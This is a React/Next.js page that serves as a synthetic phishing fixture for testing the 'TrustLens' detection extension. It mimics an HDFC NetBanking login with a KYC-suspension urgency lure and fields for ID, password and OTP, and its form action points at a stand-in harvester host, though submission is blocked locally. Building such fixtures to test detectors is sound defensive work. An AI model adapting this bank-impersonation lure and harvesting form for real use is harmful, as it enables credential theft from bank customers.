"use client";

import React, { useState } from "react";
import Link from "next/link";
import { ShieldAlert, AlertTriangle, ArrowLeft, Lock, Info, CheckCircle2 } from "lucide-react";

/**
 * TrustLens Synthetic Phishing & Social Engineering Test Harness
 * 
 * PURPOSE: A controlled, safe benchmark test environment for security researchers, judges, 
 * and developers to verify TrustLens Chrome Extension & backend heuristic detection engines.
 * 
 * SAFETY POLICY:
 * - Completely synthetic & local (localhost:3000/demo-phish-fixture).
 * - No data collection, backend logging, or credential exfiltration.
 * - Form submission is strictly prevented and alerts the user.
 */
export default function DemoPhishFixturePage() {
  const [submitted, setSubmitted] = useState(false);

  const handleSubmit = (e: React.FormEvent) => {
    e.preventDefault();
    setSubmitted(true);
  };

  return (
    <div className="min-h-screen bg-[#070B12] text-slate-100 font-sans selection:bg-red-500/30 selection:text-red-200">
      {/* Prominent Educational & Safety Disclaimer Banner */}
      <div className="bg-red-950/80 border-b border-red-500/40 px-4 py-3 text-xs sm:text-sm text-red-200 flex flex-col sm:flex-row items-center justify-between gap-3 shadow-lg shadow-red-950/40">
        <div className="flex items-center gap-2">
          <ShieldAlert className="w-5 h-5 text-red-400 shrink-0 animate-pulse" />
          <span>
            <strong className="text-red-300 font-semibold uppercase tracking-wider">
              [TrustLens Synthetic Test Harness]:
            </strong>{" "}
            This is a benign, controlled mock page designed specifically to trigger and test TrustLens extension sensors & DOM heuristic analyzers. <strong>No data is captured or transmitted.</strong>
          </span>
        </div>
        <Link
          href="/"
          className="inline-flex items-center gap-1.5 px-3 py-1 rounded-md bg-red-900/50 hover:bg-red-800/60 text-red-100 border border-red-500/30 font-mono text-xs transition-colors shrink-0"
        >
          <ArrowLeft className="w-3.5 h-3.5" /> Return to TrustLens
        </Link>
      </div>

      <div className="max-w-4xl mx-auto px-4 py-8 grid grid-cols-1 md:grid-cols-12 gap-8">
        {/* Left Column: Simulated Impersonation Portal */}
        <div className="md:col-span-7 bg-[#0E1522] border border-red-500/30 rounded-2xl p-6 sm:p-8 shadow-2xl relative overflow-hidden">
          <div className="absolute top-0 left-0 right-0 h-1 bg-gradient-to-r from-red-500 via-amber-500 to-red-500" />

          {/* Simulated Brand Cue: HDFC Bank / Global Finance Simulation */}
          <div className="flex items-center justify-between mb-6 border-b border-slate-800/80 pb-4">
            <div>
              <div className="text-xs uppercase font-mono tracking-widest text-slate-400">
                Simulated Institutional Portal
              </div>
              <h1 className="text-2xl font-bold text-white tracking-tight flex items-center gap-2">
                <span className="text-red-400 font-mono text-xl">🛡️</span> HDFC NetBanking Secure
              </h1>
            </div>
            <span className="px-2.5 py-1 text-[11px] font-mono uppercase rounded border border-red-500/40 bg-red-950/60 text-red-300">
              High-Risk Test Sim
            </span>
          </div>

          {/* Social Engineering Urgency Banner (Heuristic Trigger) */}
          <div className="bg-amber-950/40 border border-amber-500/40 rounded-xl p-3.5 mb-6 flex items-start gap-3 text-amber-200 text-xs sm:text-sm">
            <AlertTriangle className="w-5 h-5 text-amber-400 shrink-0 mt-0.5" />
            <div>
              <strong className="text-amber-300 block font-semibold mb-0.5">
                Immediate Action Required: KYC Verification Pending!
              </strong>
              Your NetBanking access is scheduled for temporary suspension within 24 hours due to unverified regulatory PAN/KYC guidelines. Confirm your credentials to maintain service continuity.
            </div>
          </div>

          {submitted ? (
            <div className="bg-emerald-950/30 border border-emerald-500/40 rounded-xl p-6 text-center">
              <CheckCircle2 className="w-10 h-10 text-emerald-400 mx-auto mb-3" />
              <h3 className="text-lg font-semibold text-emerald-300 mb-1">
                Synthetic Form Trigger Disarmed
              </h3>
              <p className="text-xs text-slate-300 max-w-sm mx-auto">
                No credentials were sent or stored. This form intercepted the submission locally with <code>event.preventDefault()</code> for benchmark testing.
              </p>
              <button
                onClick={() => setSubmitted(false)}
                className="mt-4 px-4 py-1.5 text-xs bg-slate-800 hover:bg-slate-700 text-slate-200 rounded-lg border border-slate-700 transition"
              >
                Reset Mock Form
              </button>
            </div>
          ) : (
            /* Synthetic Phishing Form with Cross-Domain Action & Credential Inputs */
            <form
              onSubmit={handleSubmit}
              action="https://unauthorized-credential-harvester-sim.net/auth"
              method="POST"
              className="space-y-4"
            >
              <div>
                <label className="block text-xs font-medium text-slate-300 mb-1.5 font-mono">
                  Customer ID / User ID
                </label>
                <input
                  type="text"
                  name="customerId"
                  required
                  placeholder="e.g. 50493821"
                  className="w-full bg-[#090D16] border border-slate-700/80 rounded-lg px-3.5 py-2.5 text-sm text-white placeholder-slate-500 focus:outline-none focus:border-red-500 transition"
                />
              </div>

              <div>
                <label className="block text-xs font-medium text-slate-300 mb-1.5 font-mono">
                  NetBanking Password / PIN
                </label>
                <input
                  type="password"
                  name="password"
                  required
                  placeholder="••••••••••••"
                  className="w-full bg-[#090D16] border border-slate-700/80 rounded-lg px-3.5 py-2.5 text-sm text-white placeholder-slate-500 focus:outline-none focus:border-red-500 transition"
                />
              </div>

              <div>
                <label className="block text-xs font-medium text-slate-300 mb-1.5 font-mono">
                  One-Time Password (OTP)
                </label>
                <input
                  type="text"
                  name="otp"
                  maxLength={6}
                  placeholder="6-digit SMS OTP code"
                  className="w-full bg-[#090D16] border border-slate-700/80 rounded-lg px-3.5 py-2.5 text-sm text-white placeholder-slate-500 focus:outline-none focus:border-red-500 transition font-mono tracking-widest"
                />
              </div>

              <div className="pt-2">
                <button
                  type="submit"
                  className="w-full bg-red-600 hover:bg-red-500 text-white font-medium py-2.5 px-4 rounded-lg text-sm transition shadow-lg shadow-red-900/30 flex items-center justify-center gap-2"
                >
                  <Lock className="w-4 h-4" /> Verify & Unlock Account
                </button>
              </div>

              <div className="text-[11px] text-slate-500 text-center font-mono pt-1">
                Synthetic Form Action: <code>https://unauthorized-credential-harvester-sim.net/auth</code>
              </div>
            </form>
          )}
        </div>

        {/* Right Column: Live Detection Inspector & Instructions */}
        <div className="md:col-span-5 flex flex-col gap-5">
          <div className="bg-[#0E1522] border border-slate-800 rounded-2xl p-5 sm:p-6 shadow-xl">
            <h2 className="text-sm font-semibold text-white uppercase tracking-wider font-mono flex items-center gap-2 mb-3">
              <Info className="w-4 h-4 text-sky-400" /> How to Test With TrustLens
            </h2>
            <ol className="space-y-3 text-xs text-slate-300 leading-relaxed list-decimal list-inside">
              <li>
                <strong className="text-white">With TrustLens Chrome Extension:</strong> Navigate to this URL (<code>http://localhost:3000/demo-phish-fixture</code>). TrustLens will dynamically detect the password field, OTP input, urgency indicators, and brand claim mismatch, instantly rendering the frosted glass alert banner!
              </li>
              <li>
                <strong className="text-white">With TrustLens Web Analyzer:</strong> Copy this page URL and paste it into the search box on the <Link href="/" className="text-sky-400 hover:underline">TrustLens Dashboard</Link>.
              </li>
              <li>
                <strong className="text-white">View Attack Chain:</strong> Observe how TrustLens maps the credential harvesting form and brand impersonation into MITRE ATT&CK stages.
              </li>
            </ol>
          </div>

          <div className="bg-[#0E1522] border border-slate-800 rounded-2xl p-5 sm:p-6 shadow-xl">
            <h3 className="text-xs font-semibold text-slate-400 uppercase tracking-wider font-mono mb-3">
              Simulated Risk Signals Built In
            </h3>
            <ul className="space-y-2 text-xs font-mono">
              <li className="flex items-center gap-2 text-red-300 bg-red-950/30 px-2.5 py-1.5 rounded border border-red-500/20">
                <span className="w-1.5 h-1.5 rounded-full bg-red-400" />
                <span>Brand Claim: HDFC Bank on non-official host</span>
              </li>
              <li className="flex items-center gap-2 text-amber-300 bg-amber-950/30 px-2.5 py-1.5 rounded border border-amber-500/20">
                <span className="w-1.5 h-1.5 rounded-full bg-amber-400" />
                <span>Urgency Indicator: &quot;Within 24 hours&quot;</span>
              </li>
              <li className="flex items-center gap-2 text-rose-300 bg-rose-950/30 px-2.5 py-1.5 rounded border border-rose-500/20">
                <span className="w-1.5 h-1.5 rounded-full bg-rose-400" />
                <span>Sensitive Input: Password &amp; OTP Fields</span>
              </li>
              <li className="flex items-center gap-2 text-purple-300 bg-purple-950/30 px-2.5 py-1.5 rounded border border-purple-500/20">
                <span className="w-1.5 h-1.5 rounded-full bg-purple-400" />
                <span>Form Target: External Harvester URL</span>
              </li>
            </ul>
          </div>
        </div>
      </div>
    </div>
  );
}
